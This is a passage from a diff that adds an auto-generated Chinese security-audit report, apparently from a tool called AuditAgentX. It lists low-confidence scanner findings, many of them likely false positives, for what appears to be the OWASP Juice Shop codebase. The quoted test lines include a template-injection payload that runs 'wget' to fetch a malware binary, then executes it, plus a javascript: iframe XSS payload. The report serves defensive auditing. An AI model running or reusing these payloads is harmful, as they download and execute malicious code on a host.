+    frontend/src/app/Services/security-question.service.ts:21　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.host + &#39;/&#39;, { params }).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.361 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/security-question.service.ts:25　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.hostServer + &#39;/&#39; + &#39;rest/user/security-question?email=&#39; + email).pipe(</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.362 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/track-order.service.ts:22　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(`${this.host}/${params}`).pipe(map((response: any) =&gt; response), catchError((error) =&gt; { throw error }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.363 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/two-factor-auth-service.ts:49　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(`${environment.hostServer}/rest/2fa/setup`, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.364 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/two-factor-auth-service.ts:57　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(`${environment.hostServer}/rest/2fa/disable`, { password })</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.365 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/user.service.ts:29　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.hostServer + &#39;/rest/user/authentication-details/&#39;, { params }).pipe(map((response: any) =&gt;</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.366 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/user.service.ts:34　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(`${this.host}/${id}`).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.367 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/user.service.ts:38　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(this.host + &#39;/&#39;, params).pipe(</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.368 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/user.service.ts:46　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(this.hostServer + &#39;/rest/user/login&#39;, params).pipe(map((response: any) =&gt; response.authentication), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.369 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/user.service.ts:54　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.hostServer + &#39;/rest/user/change-password?current=&#39; + passwords.current + &#39;&amp;new=&#39; +</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.370 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/user.service.ts:59　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(this.hostServer + &#39;/rest/user/reset-password&#39;, params).pipe(map((response: any) =&gt; response.user), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.371 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/user.service.ts:64　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.hostServer + &#39;/rest/user/whoami&#39; + queryParam).pipe(map((response: any) =&gt; response.user), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.372 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/user.service.ts:68　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(&#39;https://www.googleapis.com/oauth2/v1/userinfo?alt=json&amp;access_token=&#39; + accessToken)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.373 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/user.service.ts:72　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.hostServer + &#39;/rest/saveLoginIp&#39;).pipe(map((response: any) =&gt; response), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.374 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/user.service.ts:76　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.get(this.hostServer + &#39;/rest/deluxe-membership&#39;).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.375 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/app/Services/user.service.ts:80　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>return this.http.post(this.hostServer + &#39;/rest/deluxe-membership&#39;, { paymentMode, paymentId }).pipe(map((response: any) =&gt; response.data), catchError((err) =&gt; { throw err }))</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.376 XSS <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/dat.gui.min.js:1　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>var dat=dat||{};dat.gui=dat.gui||{};dat.utils=dat.utils||{};dat.controllers=dat.controllers||{};dat.dom=dat.dom||{};dat.color=dat.color||{};dat.utils.css=function(){return{load:function(e,a){a=a||docu</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.377 XSS <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/dat.gui.min.js:13　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>dat.controllers.OptionController=function(e,a,b){var d=function(f,c,e){d.superclass.call(this,f,c);var k=this;this.__select=document.createElement(&#34;select&#34;);if(b.isArray(e)){var l={};b.each(e,function</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.378 XSS <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/stats.min.js:3　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>i.innerHTML=&#34;FPS&#34;;a.appendChild(i);var c=document.createElement(&#34;div&#34;);c.id=&#34;fpsGraph&#34;;c.style.cssText=&#34;position:relative;width:74px;height:30px;background-color:#0ff&#34;;for(a.appendChild(c);74&gt;c.childr</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.379 XSS <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/stats.min.js:4　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>k.id=&#34;msText&#34;;k.style.cssText=&#34;color:#0f0;font-family:Helvetica,Arial,sans-serif;font-size:9px;font-weight:bold;line-height:15px&#34;;k.innerHTML=&#34;MS&#34;;d.appendChild(k);var e=document.createElement(&#34;div&#34;);</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.380 Command Injection <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/three.js:310　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>var color = /^rgb\((\d+), ?(\d+), ?(\d+)\)$/i.exec( style );</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.381 Command Injection <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/assets/private/three.js:324　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>var color = /^rgb\((\d+)\%, ?(\d+)\%, ?(\d+)\%\)$/i.exec( style );</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.382 XSS <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/hacking-instructor/challenges/bonusPayload.ts:33　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>resolved: waitForElementsInnerHtmlToBe(&#39;#searchValue&#39;, &#39;&lt;iframe width=&#34;100%&#34; height=&#34;166&#34; scrolling=&#34;no&#34; frameborder=&#34;no&#34; allow=&#34;autoplay&#34; src=&#34;https://w.soundcloud.com/player/?url=https%3A//api.sound</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.383 XSS <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    frontend/src/hacking-instructor/challenges/domXss.ts:99　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>resolved: waitForElementsInnerHtmlToBe(&#39;#searchValue&#39;, &#39;&lt;iframe src=&#34;javascript:alert(`xss`)&#34;&gt;&lt;/iframe&gt;&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.384 Command Injection <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    lib/codingChallenges.ts:76　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>if (new RegExp(`vuln-code-snippet vuln-line.*${challengeKey}`).exec(lines[i]) != null) {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.385 Command Injection <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    lib/codingChallenges.ts:78　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>} else if (new RegExp(`vuln-code-snippet neutral-line.*${challengeKey}`).exec(lines[i]) != null) {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.386 XSS <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    routes/chat.ts:241　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>res.write(`data: ${JSON.stringify({ choices: [{ finish_reason: event.finishReason }] })}\n\n`)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.387 XSS <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    routes/chat.ts:255　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>res.write(`data: ${JSON.stringify({ error: `LLM error: ${event.error as string}` })}\n\n`)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.388 XSS <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    routes/chat.ts:264　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>res.write(`data: ${JSON.stringify({ error: &#39;LLM API is not reachable&#39; })}\n\n`)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.389 Path Traversal <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    routes/languages.ts:31　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const content = await readFile(&#39;frontend/dist/frontend/assets/i18n/&#39; + fileName, &#39;utf-8&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.390 Path Traversal <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    routes/languages.ts:40　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const backendContent = await readFile(&#39;i18n/&#39; + fileName, &#39;utf-8&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.391 XSS <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    routes/videoHandler.ts:72　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>res.send(compiledTemplate)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.392 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    test/cypress/e2e/basket.spec.ts:59　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>await fetch(`${Cypress.config(&#39;baseUrl&#39;)}/api/BasketItems/`, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.393 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    test/cypress/e2e/complain.spec.ts:24　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>await fetch(`${Cypress.config(&#39;baseUrl&#39;)}/file-upload`, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.394 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    test/cypress/e2e/complain.spec.ts:41　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>await fetch(`${Cypress.config(&#39;baseUrl&#39;)}/file-upload`, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.395 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    test/cypress/e2e/contact.spec.ts:206　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>await fetch(`${Cypress.config(&#39;baseUrl&#39;)}/api/Feedbacks`, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.396 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    test/cypress/e2e/dataErasure.spec.ts:11　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const response = await fetch(`${Cypress.config(&#39;baseUrl&#39;)}/dataerasure`, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.397 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    test/cypress/e2e/noSql.spec.ts:58　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>await fetch(`${Cypress.config(&#39;baseUrl&#39;)}/rest/products/reviews`, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.398 Command Injection <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    test/cypress/e2e/profile.spec.ts:55　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>&#34;#{global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true &amp;&amp; chmod +x malware &amp;&amp; ./malware&#39;)}&#34;,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.399 Path Traversal <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    test/cypress/e2e/profile.spec.ts:55　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>&#34;#{global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true &amp;&amp; chmod +x malware &amp;&amp; ./malware&#39;)}&#34;,</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.400 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    test/cypress/e2e/profile.spec.ts:101　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const response = await fetch(`${Cypress.config(&#39;baseUrl&#39;)}/profile`, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.401 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    test/cypress/e2e/register.spec.ts:52　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const response = await fetch(`${Cypress.config(&#39;baseUrl&#39;)}/api/Users/`, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.402 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    test/cypress/e2e/register.spec.ts:76　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const response = await fetch(`${Cypress.config(&#39;baseUrl&#39;)}/api/Users/`, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.403 SSRF <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    test/cypress/e2e/register.spec.ts:98　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>const response = await fetch(`${Cypress.config(&#39;baseUrl&#39;)}/api/Users`, {</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+  <h3>4.404 XSS <span class="badge low">LOW</span></h3>
+  <p class="meta">
+    test/files/encrypt.py:14　
+    来源 custom-taint　
+    置信度 0.5　
+    未验证　
+    状态 needs_review
+  </p>
+  <pre><code>encrypted_document.write(str(pow(ord(char), e, N)) + &#39;\n&#39;)</code></pre>
+  <p><b>修复建议：</b>使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。</p>
+  
+  
+
+  <h2>5. 关键风险</h2>
+  <ul><li>HIGH run-shell-injection 位于 C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\update-challenges-www-legacy.yml:36，状态为 needs_review。</li><li>HIGH run-shell-injection 位于 C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\update-challenges-www.yml:27，状态为 needs_review。</li><li>HIGH run-shell-injection 位于 C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\update-challenges-www.yml:36，状态为 needs_review。</li><li>HIGH express-sequelize-injection 位于 C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\codefixes\dbSchemaChallenge_1.ts:5，状态为 needs_review。</li><li>HIGH express-sequelize-injection 位于 C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\codefixes\dbSchemaChallenge_3.ts:11，状态为 needs_review。</li></ul>
+
+  <h2>6. 修改建议</h2>
+  <ul>
+    
+    <li><b>P0 优先修复 Critical/High 漏洞：</b>先处理已确认、已复现或处于核心入口路径上的高危问题，修复后重新扫描并保留复测证据。</li>
+    
+    <li><b>P1 按漏洞类型批量治理：</b>对 SQL 注入、命令注入、路径遍历等同类问题统一采用参数化查询、白名单校验和安全 API。</li>
+    
+    <li><b>P1 补充动态验证覆盖：</b>为高危候选漏洞配置本地靶场或授权 URL，让 ExploitAgent/DynamicVerifier 生成可复现证据。</li>
+    
+    <li><b>P2 纳入持续审计流程：</b>将静态扫描、VerifyAgent 复核和报告生成接入提交前或 CI 流程，避免修复后回归。</li>
+    
+  </ul>
+
+  <h2>7. 结论</h2>
+  <p>综合项目规模、漏洞数量、严重等级和验证结果，当前项目处于 HIGH 风险水平。建议先处理已确认的高危/可复现漏洞，再统一治理同类输入校验、权限控制、敏感信息管理和依赖安全问题。</p>
+
+  <hr>
+  <p class="meta">本报告由 AuditAgentX 自动生成，PoC 仅在本地授权沙箱或授权目标环境验证。</p>
+</body>
+</html>
